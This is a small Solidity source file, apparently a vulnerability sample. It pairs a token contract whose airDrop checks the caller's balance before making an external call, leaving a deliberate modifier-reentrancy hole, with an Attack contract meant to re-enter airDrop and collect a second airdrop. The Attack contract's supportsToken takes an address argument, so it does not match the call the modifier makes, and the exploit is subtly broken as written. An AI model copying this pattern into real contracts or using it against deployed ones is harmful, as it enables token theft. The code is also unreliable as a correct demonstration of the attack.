pragma solidity ^0.4.24;

contract ModifierEntrancy {
    mapping(address => uint) public tokenBalance;
    string constant name = "Nu Token";

    function airDrop() public hasNoBalance supportsToken {
        tokenBalance[msg.sender] += 20;
    }

    modifier supportsToken() {
        require(
            keccak256(abi.encodePacked("Nu Token")) ==
                Bank(msg.sender).supportsToken()
        );
        _;
    }

    modifier hasNoBalance() {
        require(tokenBalance[msg.sender] == 0);
        _;
    }
}

contract Bank {
    function supportsToken() external pure returns (bytes32) {
        return (keccak256(abi.encodePacked("Nu Token")));
    }
}

contract Attack {
    bool hasBeenCalled;

    function supportsToken(address entrancy) external returns (bytes32) {
        if (!hasBeenCalled) {
            hasBeenCalled = true;
            ModifierEntrancy(entrancy).airDrop();
        }
        return (keccak256(abi.encodePacked("Nu Token")));
    }

    function call(address entrancy) public {
        ModifierEntrancy(entrancy).airDrop();
    }
}